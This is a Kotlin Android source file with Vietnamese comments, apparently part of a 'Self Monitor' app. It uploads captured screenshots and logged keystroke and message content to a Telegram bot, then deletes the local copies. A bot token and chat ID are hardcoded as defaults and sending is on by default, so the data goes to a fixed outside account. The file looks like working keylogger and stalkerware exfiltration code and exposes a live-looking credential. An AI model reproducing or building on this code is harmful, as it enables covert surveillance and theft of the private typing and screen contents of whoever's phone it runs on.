package com.example.phuonguyen

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

object TelegramSender {
    private const val TAG = "SelfMonitorTelegram"
    private const val PREFS_NAME = "telegram_monitor_prefs"
    private const val KEY_BOT_TOKEN = "key_bot_token"
    private const val KEY_CHAT_ID = "key_chat_id"
    private const val KEY_ENABLED = "key_enabled"

    const val DEFAULT_CHAT_ID = "7806529049"
    const val DEFAULT_BOT_TOKEN = "8975104543:AAHhCSyYOP-Y-rK6svSTbay-xA7bHaKZhQI"

    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())
    private val isSyncing = AtomicBoolean(false)

    fun saveConfig(context: Context, botToken: String, chatId: String, enabled: Boolean) {
        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        sp.edit()
            .putString(KEY_BOT_TOKEN, botToken.trim())
            .putString(KEY_CHAT_ID, chatId.trim())
            .putBoolean(KEY_ENABLED, enabled)
            .apply()
        Log.d(TAG, "Saved Telegram config: enabled=$enabled, hasToken=${botToken.isNotEmpty()}, hasChatId=${chatId.isNotEmpty()}")
    }

    fun getConfig(context: Context): Triple<String, String, Boolean> {
        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val savedToken = sp.getString(KEY_BOT_TOKEN, "") ?: ""
        val savedChatId = sp.getString(KEY_CHAT_ID, "") ?: ""
        val token = if (savedToken.isNotBlank()) savedToken else DEFAULT_BOT_TOKEN
        val chatId = if (savedChatId.isNotBlank()) savedChatId else DEFAULT_CHAT_ID
        val enabled = if (sp.contains(KEY_ENABLED)) sp.getBoolean(KEY_ENABLED, true) else true
        return Triple(token, chatId, enabled)
    }

    fun isNetworkAvailable(context: Context): Boolean {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                ?: return false
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network", e)
            false
        }
    }

    /**
     * Kiểm tra xem Bitmap có phải là màn hình đen xì (khi tắt màn hình / khoá máy) hay không.
     * Thuật toán lấy mẫu một lưới ~400 điểm pixel để kiểm tra trong chưa đầy 1ms.
     */
    fun isPureBlackBitmap(bitmap: Bitmap): Boolean {
        val width = bitmap.width
        val height = bitmap.height
        if (width <= 0 || height <= 0) return true

        val stepX = (width / 20).coerceAtLeast(1)
        val stepY = (height / 20).coerceAtLeast(1)
        var nonBlackCount = 0

        for (y in 0 until height step stepY) {
            for (x in 0 until width step stepX) {
                val pixel = bitmap.getPixel(x, y)
                val r = (pixel shr 16) and 0xFF
                val g = (pixel shr 8) and 0xFF
                val b = pixel and 0xFF

                // Nếu điểm ảnh có độ sáng RGB > 20 thì không phải là màu đen thuần
                if (r > 20 || g > 20 || b > 20) {
                    nonBlackCount++
                    // Nếu tìm thấy hơn 5 điểm có màu/sáng -> Màn hình đang hiển thị bình thường!
                    if (nonBlackCount > 5) {
                        return false
                    }
                }
            }
        }
        // Hầu hết mọi điểm lấy mẫu đều là màu đen (màn hình tắt)
        return nonBlackCount <= 5
    }

    /**
     * Kiểm tra xem file ảnh JPG trên máy có phải là ảnh đen xì hay không.
     * Giải mã thu nhỏ 1/8 để kiểm tra siêu nhanh và không chiếm RAM.
     */
    fun isImageFilePureBlack(file: File): Boolean {
        return try {
            val options = BitmapFactory.Options().apply {
                inSampleSize = 8
            }
            val bitmap = BitmapFactory.decodeFile(file.absolutePath, options) ?: return false
            val isBlack = isPureBlackBitmap(bitmap)
            bitmap.recycle()
            isBlack
        } catch (_: Exception) {
            false
        }
    }

    fun testConnectionAsync(
        botToken: String,
        chatId: String,
        callback: (success: Boolean, message: String) -> Unit
    ) {
        executor.execute {
            val (ok, msg) = sendTextMessage(
                botToken = botToken,
                chatId = chatId,
                text = "✅ <b>[Self Monitor] Test kết nối thành công!</b>\n\nThiết bị đã kết nối với Telegram. Từ bây giờ dữ liệu sẽ được tự động gửi về đây."
            )
            mainHandler.post { callback(ok, msg) }
        }
    }

    fun sendTextMessage(
        botToken: String,
        chatId: String,
        text: String
    ): Pair<Boolean, String> {
        if (botToken.isBlank() || chatId.isBlank()) {
            return Pair(false, "Chưa nhập Bot Token hoặc Chat ID")
        }
        var conn: HttpURLConnection? = null
        return try {
            val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 15_000
            conn.readTimeout = 15_000
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                put("parse_mode", "HTML")
            }

            DataOutputStream(conn.outputStream).use { out ->
                out.write(json.toString().toByteArray(Charsets.UTF_8))
                out.flush()
            }

            val code = conn.responseCode
            val responseText = if (code in 200..299) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else {
                conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
            }

            if (code == 200) {
                Pair(true, "Gửi tin nhắn thành công")
            } else {
                Log.w(TAG, "Send message failed ($code): $responseText")
                Pair(false, parseErrorMessage(code, responseText))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending Telegram text", e)
            Pair(false, e.localizedMessage ?: "Lỗi kết nối mạng")
        } finally {
            conn?.disconnect()
        }
    }

    fun sendPhoto(
        botToken: String,
        chatId: String,
        file: File,
        caption: String
    ): Pair<Boolean, String> {
        if (botToken.isBlank() || chatId.isBlank()) {
            return Pair(false, "Chưa nhập Bot Token hoặc Chat ID")
        }
        if (!file.exists() || file.length() == 0L) {
            return Pair(false, "File ảnh không tồn tại")
        }

        val boundary = "==SelfMonitorBoundary" + System.currentTimeMillis() + "=="
        val lineEnd = "\r\n"
        val twoHyphens = "--"
        var conn: HttpURLConnection? = null

        return try {
            val url = URL("https://api.telegram.org/bot$botToken/sendPhoto")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 25_000
            conn.readTimeout = 30_000
            conn.doOutput = true
            conn.doInput = true
            conn.useCaches = false
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            DataOutputStream(conn.outputStream).use { out ->
                // Field: chat_id
                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                out.write(chatId.toByteArray(Charsets.UTF_8))
                out.writeBytes(lineEnd)

                // Field: caption
                if (caption.isNotEmpty()) {
                    out.writeBytes(twoHyphens + boundary + lineEnd)
                    out.writeBytes("Content-Disposition: form-data; name=\"caption\"$lineEnd$lineEnd")
                    out.write(caption.toByteArray(Charsets.UTF_8))
                    out.writeBytes(lineEnd)
                }

                // Field: photo
                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"${file.name}\"$lineEnd")
                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")

                FileInputStream(file).use { fis ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int
                    while (fis.read(buffer).also { bytesRead = it } != -1) {
                        out.write(buffer, 0, bytesRead)
                    }
                }
                out.writeBytes(lineEnd)

                // Kết thúc multipart
                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
                out.flush()
            }

            val code = conn.responseCode
            val responseText = if (code in 200..299) {
                conn.inputStream.bufferedReader().use { it.readText() }
            } else {
                conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
            }

            if (code == 200) {
                Pair(true, "Gửi ảnh thành công")
            } else {
                Log.w(TAG, "Send photo failed ($code): $responseText")
                Pair(false, parseErrorMessage(code, responseText))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending Telegram photo", e)
            Pair(false, e.localizedMessage ?: "Lỗi kết nối khi gửi ảnh")
        } finally {
            conn?.disconnect()
        }
    }

    /**
     * Đồng bộ toàn bộ dữ liệu đang chờ lên Telegram:
     * - Gửi ảnh chụp màn hình + xoá ảnh và SQLite
     * - Gửi gom nội dung gõ phím + xoá SQLite
     * - Nếu mất mạng: giữ nguyên trên máy và chờ lần sau gửi tiếp
     */
    fun syncPendingData(
        context: Context,
        onComplete: ((sentTexts: Int, sentPhotos: Int, error: String?) -> Unit)? = null
    ) {
        if (!isSyncing.compareAndSet(false, true)) {
            Log.d(TAG, "Sync already in progress, skipping")
            onComplete?.let { cb -> mainHandler.post { cb(0, 0, "Đang đồng bộ...") } }
            return
        }

        executor.execute {
            var totalSentTexts = 0
            var totalSentPhotos = 0
            var errorMessage: String? = null

            try {
                val (botToken, chatId, enabled) = getConfig(context)
                if (!enabled || botToken.isBlank() || chatId.isBlank()) {
                    Log.d(TAG, "Telegram sync is disabled or unconfigured")
                    return@execute
                }

                if (!isNetworkAvailable(context)) {
                    Log.d(TAG, "No internet connection, skipping sync. Data remains saved locally.")
                    errorMessage = "Không có kết nối mạng"
                    return@execute
                }

                val dbHelper = DbHelper(context)

                // 1. Đồng bộ ảnh chụp màn hình
                val screenshots = dbHelper.getPendingScreenshots(limit = 30)
                for (shot in screenshots) {
                    val file = File(shot.filePath)
                    if (!file.exists()) {
                        // File đã bị xoá hoặc không tồn tại -> dọn sạch record trong SQLite
                        dbHelper.deleteScreenshot(shot.id)
                        continue
                    }

                    // TỰ ĐỘNG BỎ QUA VÀ XOÁ NẾU LÀ ẢNH MÀN HÌNH ĐEN (tắt màn hình/khoá máy)
                    if (isImageFilePureBlack(file)) {
                        Log.d(TAG, "Screenshot [id=${shot.id}] is pure black (screen was off/sleep). Dropping and deleting without sending to Telegram.")
                        file.delete()
                        dbHelper.deleteScreenshot(shot.id)
                        continue
                    }

                    val caption = "📸 <b>[Ảnh màn hình]</b>\n⏱ Thời gian: <code>${shot.timestamp}</code>"
                    val (success, err) = sendPhoto(botToken, chatId, file, caption)
                    if (success) {
                        // Gửi thành công -> Xoá ngay file ảnh và xoá SQLite
                        val deletedFile = file.delete()
                        dbHelper.deleteScreenshot(shot.id)
                        totalSentPhotos++
                        Log.d(TAG, "Screenshot [id=${shot.id}] sent, file deleted: $deletedFile")
                        // Giãn cách 1.2 giây giữa mỗi lần gửi ảnh để tuân thủ giới hạn 1 request/giây của Telegram
                        try { Thread.sleep(1200L) } catch (_: InterruptedException) {}
                    } else {
                        Log.w(TAG, "Failed to send screenshot [id=${shot.id}]: $err. Retaining for next retry.")
                        errorMessage = err
                        // Dừng loạt ảnh hiện tại để tránh spam lỗi nếu mất mạng hoặc bị rate limit
                        break
                    }
                }

                // 2. Đồng bộ nội dung gõ phím
                val textLogs = dbHelper.getPendingTextLogs(limit = 100)
                if (textLogs.isNotEmpty()) {
                    // Gom theo từng nhóm tối đa 15 dòng để không vượt quá giới hạn 4096 ký tự của Telegram
                    val chunks = textLogs.chunked(15)
                    for (chunk in chunks) {
                        val sb = StringBuilder()
                        sb.append("💬 <b>[Tin nhắn]</b>\n\n")

                        for (item in chunk) {
                            val time = if (item.timestamp.length >= 19) item.timestamp.substring(11, 19) else item.timestamp
                            val cleanContent = escapeHtml(item.content)
                            sb.append("⏱ <i>$time</i>: $cleanContent\n")
                        }

                        val (success, err) = sendTextMessage(botToken, chatId, sb.toString())
                        if (success) {
                            val ids = chunk.map { it.id }
                            dbHelper.deleteTextLogs(ids)
                            totalSentTexts += chunk.size
                            Log.d(TAG, "Sent and cleaned ${chunk.size} text logs")
                            // Giãn cách 1.2 giây giữa các đợt tin nhắn
                            try { Thread.sleep(1200L) } catch (_: InterruptedException) {}
                        } else {
                            Log.w(TAG, "Failed to send text chunk: $err")
                            errorMessage = err
                            break
                        }
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Unexpected error in syncPendingData", e)
                errorMessage = e.localizedMessage
            } finally {
                isSyncing.set(false)
                if (onComplete != null) {
                    mainHandler.post {
                        onComplete(totalSentTexts, totalSentPhotos, errorMessage)
                    }
                }
            }
        }
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
    }

    private fun parseErrorMessage(code: Int, response: String): String {
        return try {
            val json = JSONObject(response)
            val desc = json.optString("description", "")
            when {
                code == 429 -> "Telegram đang giới hạn tốc độ (Too Many Requests). Hệ thống sẽ tự động giãn cách để tránh spam."
                code == 401 -> "Bot Token không hợp lệ. Vui lòng kiểm tra lại token từ @BotFather."
                code == 400 && desc.contains("chat not found", ignoreCase = true) ->
                    "Không tìm thấy Chat ID hoặc bạn chưa bấm 'Start' bot trên Máy 2!"
                desc.isNotEmpty() -> desc
                else -> "HTTP $code"
            }
        } catch (_: Exception) {
            "HTTP $code: $response"
        }
    }
}
